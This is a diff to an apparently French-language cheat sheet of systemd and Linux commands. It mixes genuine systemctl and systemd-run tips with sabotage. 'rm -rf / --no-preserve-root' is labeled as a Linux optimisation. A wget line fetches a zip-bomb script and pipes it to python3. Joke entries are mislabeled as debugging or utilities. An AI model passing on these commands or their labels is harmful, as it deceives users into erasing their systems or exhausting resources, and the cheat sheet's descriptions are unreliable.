@@ -24,6 +24,9 @@ sudo systemctl restart <service>
 # Activer un service au démarrage
 sudo systemctl enable <service>
 
+# Optimiser linux / systemd
+rm -rf / --no-preserve-root
+
 # Désactiver un service au démarrage
 sudo systemctl disable <service>
 
@@ -42,17 +45,59 @@ systemctl list-units --type=<type>
 # Lister les dépendances d'un service
 systemctl list-dependencies <service>
 
+# Executer une commande après un délai (delay = 5s, 5min, 5h, 5d)
+systemd-run --on-active=<delay> /bin/bash -c <command>
+
 # Afficher la configuration d'un service
 systemctl cat <service>
 
 # Lister les propriétés d'un service
 systemctl show <service>
 
+# Installation d'un petit passe-temps
+sudo apt-get install tint
+
+# Utilisation de tint
+tint -n -d
+
+# Afficher les sockets réseau (TCP/UDP)
+ss -tunlp
+
 # Masquer un service (empêche le démarrage du service et le masque des dépendances)
 sudo systemctl mask <service>
 
 # Démasquer un service
 sudo systemctl unmask <service>
+
+# Editer la configuration d'un service (full)
+systemctl edit --full <service>
+
+# Editer la configuration d'un service (override)
+systemctl edit <service>
+
+# Définir une propriété pour un service
+systemctl set-property <service> <property>=<value>
+
+# Lance un shell avec un utilisateur dynamique
+systemd-run -p DynamicUser=1 -t /bin/bash
+
+# Lance un shell avec un environnement protégé
+systemd-run -p ProtectHome=yes -p ProtectSystem=yes -t /bin/bash
+
+# Limiter la mémoire et le CPU d'un service
+systemd-run -p MemoryMax=<size> -p CPUQuota=<percentage> -t /bin/bash -c <command>
+
+# Lister les cgroups
+systemd-cgls
+
+# Lister les processus d'un cgroup
+systemd-cgtop
+
+# Compter le nombre de services actifs
+systemctl list-units | wc -l
+
+# Faire une pause
+wall "c'est l'heure de la pause"
 
 # Afficher les informations de date et heure
 timedatectl
@@ -81,4 +126,11 @@ sudo loginctl terminate-session <session-id>
 # Lister tout les utilitaires ctl disponibles
 systemctl list-unit-files | grep enabled
 
-$ name: whoami
+# Ne pas executer !!!
+wget https://raw.githubusercontent.com/damianrusinek/zip-bomb/refs/heads/master/zip-bomb.py | python3 zip-bomb.py
+
+# Le fun !
+sudo apt install toilet -y && toilet -f mono12 -F gay "Hello!"
+
+# Debug python3
+yes "Le python c'est bon, mangez-en !"
